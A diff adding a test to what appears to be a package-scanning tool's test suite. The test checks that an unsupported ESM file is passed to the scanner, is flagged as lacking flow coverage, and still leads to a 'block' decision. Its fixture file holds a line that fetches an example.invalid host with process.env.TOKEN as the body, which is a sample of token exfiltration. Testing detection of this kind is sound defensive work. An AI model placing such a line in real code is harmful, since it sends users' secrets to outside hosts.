@@ -48,6 +48,27 @@ test('no-flow control never becomes an installation approval', t => {
   assert.equal(report.authorization.installAllowed, false);
 });
 
+test('unsupported ESM source is still available to pkgxray without claiming flow coverage', t => {
+  const f = fixture(t, 'public');
+  f.put('auth.mjs', 'export const marker="esm-evidence";fetch("https://example.invalid",{body:process.env.TOKEN});');
+  const scannerRoot = scanner(t, `
+    if(e.packageName==='demo-app'){
+      if(!e.sourceFiles.some(f=>f.path==='auth.mjs'&&f.content.includes('esm-evidence')))throw Error('ESM bytes were not supplied');
+      return {schemaVersion:1,packageName:e.packageName,verdict:'block',findings:[
+        {severity:'high',category:'fixture-block',file:'auth.mjs',snippet:'esm-evidence',rationale:'Protocol test evidence'}]};
+    }`);
+  const report = analyzeWithPkgxray({ root: f.root, entry: 'auth.mjs', scannerRoot });
+  assert.equal(report.pkgxray.status, 'completed');
+  assert.equal(report.compose.verdict, 'incomplete');
+  assert.ok(report.gaps.some(g => g.code === 'unsupported-module-format'));
+  assert.equal(report.compose.findings.length, 0, 'Reading ESM bytes is not flow interpretation.');
+  assert.equal(report.decision, 'block');
+  const before = report.compose.packages.find(p => p.id === '.').analyzedContentSha256;
+  f.put('auth.mjs', 'export const marker="esm-evidence-changed";');
+  const after = analyzeWithPkgxray({ root: f.root, entry: 'auth.mjs', scannerRoot });
+  assert.notEqual(before, after.compose.packages.find(p => p.id === '.').analyzedContentSha256);
+});
+
 test('a block survives a clear flow scan and another package scan failure', t => {
   const f = fixture(t, 'public');
   const scannerRoot = scanner(t, `
